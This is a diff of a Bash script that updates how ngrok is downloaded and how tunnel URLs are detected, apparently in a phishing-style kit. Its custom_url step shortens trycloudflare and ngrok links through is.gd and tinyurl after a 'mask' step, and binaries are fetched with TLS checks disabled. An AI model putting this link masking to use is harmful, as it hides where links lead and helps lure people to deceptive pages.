@@ -350,33 +350,41 @@ install_ngrok() {
 		ngrok_arch="linux-386"
 	fi
 
-	# Try downloading as zip (most common format)
-	zipfile=".server/ngrok.zip"
-	echo -e "\n${CYAN}Downloading Ngrok for ${ngrok_arch}...${WHITE}"
-	if curl --silent --insecure --fail --retry 3 --retry-delay 2 --location --output "$zipfile" "https://bin.equinox.io/b/6panyg5ky5gf/ngrok-v3-stable-linux-${ngrok_arch}.zip" 2>/dev/null; then
-		if unzip -qq -o "$zipfile" -d .server/ > /dev/null 2>&1; then
-			if [[ -e ".server/ngrok" ]]; then
-				chmod +x .server/ngrok
-				rm -f "$zipfile"
-				return
+	# Download ngrok v3 stable (tgz format from official source)
+	archive=".server/ngrok.tgz"
+	echo -e "\n${CYAN}Downloading Ngrok v3 for ${ngrok_arch}...${WHITE}"
+
+	# Official ngrok v3 stable download URLs
+	download_urls=(
+		"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-${ngrok_arch}.tgz"
+		"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-${ngrok_arch}.zip"
+	)
+
+	download_success=false
+	for dl_url in "${download_urls[@]}"; do
+		echo -e "${CYAN}Trying: ${dl_url}${WHITE}"
+		if curl --silent --insecure --fail --retry 3 --retry-delay 2 --location --output "$archive" "$dl_url" 2>/dev/null; then
+			if [[ -s "$archive" ]]; then
+				# Try extracting as tgz first, then as zip
+				if tar -xzf "$archive" -C .server/ 2>/dev/null || unzip -qq -o "$archive" -d .server/ 2>/dev/null; then
+					if [[ -e ".server/ngrok" ]]; then
+						chmod +x .server/ngrok
+						rm -f "$archive"
+						download_success=true
+						break
+					fi
+				fi
 			fi
 		fi
-	fi
-	rm -f "$zipfile"
+		rm -f "$archive"
+	done
 
-	# Try direct binary download
-	echo -e "${CYAN}Trying direct binary download...${WHITE}"
-	if curl --silent --insecure --fail --retry 3 --retry-delay 2 --location --output .server/ngrok "https://bin.equinox.io/b/6panyg5ky5gf/ngrok-${ngrok_arch}" 2>/dev/null; then
-		if [[ -s ".server/ngrok" ]]; then
-			chmod +x .server/ngrok
-			return
-		fi
+	if [[ "$download_success" == "false" ]]; then
+		echo -e "\n${ORANGE}Warning: Ngrok download failed.${WHITE}"
+		echo -e "${CYAN}Please download ngrok manually from ${GREEN}https://ngrok.com/download${CYAN}"
+		echo -e "${CYAN}and place it at ${GREEN}.server/ngrok${CYAN} then run ${GREEN}chmod +x .server/ngrok${WHITE}"
+		touch .server/ngrok.unavailable
 	fi
-	rm -f .server/ngrok
-
-	# Download failed - mark as unavailable
-	echo -e "\n${ORANGE}Warning: Ngrok download failed. Use Cloudflared instead (option 2).${WHITE}"
-	touch .server/ngrok.unavailable
 }
 
 ## Exit message
@@ -561,13 +569,16 @@ start_ngrok() {
 	ngrok_url=""
 	for i in {1..15}; do
 		sleep 2
-		ngrok_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.ngrok\.io' .server/.ngrok.log 2>/dev/null | head -1)
-		[[ -z "$ngrok_url" ]] && ngrok_url=$(grep -oE 'http://[a-zA-Z0-9.-]+\.ngrok\.io' .server/.ngrok.log 2>/dev/null | head -1)
+		# Ngrok v3 uses ngrok-free.app domains, v2 used ngrok.io
+		ngrok_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.ngrok-free\.app' .server/.ngrok.log 2>/dev/null | head -1)
+		[[ -z "$ngrok_url" ]] && ngrok_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.ngrok\.io' .server/.ngrok.log 2>/dev/null | head -1)
+		[[ -z "$ngrok_url" ]] && ngrok_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.ngrok\.app' .server/.ngrok.log 2>/dev/null | head -1)
 		[[ -n "$ngrok_url" ]] && break
 	done
 
 	if [[ -z "$ngrok_url" ]]; then
 		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to get Ngrok URL. Check .server/.ngrok.log"
+		cat .server/.ngrok.log 2>/dev/null | tail -5
 		return 1
 	fi
 
@@ -645,7 +656,7 @@ custom_url() {
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ trycloudflare\.com$ ]] || [[ ${url} =~ ngrok\.io$ ]]; then
+	if [[ ${url} =~ trycloudflare\.com$ ]] || [[ ${url} =~ ngrok\.io$ ]] || [[ ${url} =~ ngrok-free\.app$ ]] || [[ ${url} =~ ngrok\.app$ ]]; then
 		# Try is.gd first, then tinyurl as fallback
 		if [[ $(site_stat "$isgd") == 2* ]]; then
 			shorten "$isgd" "$url"
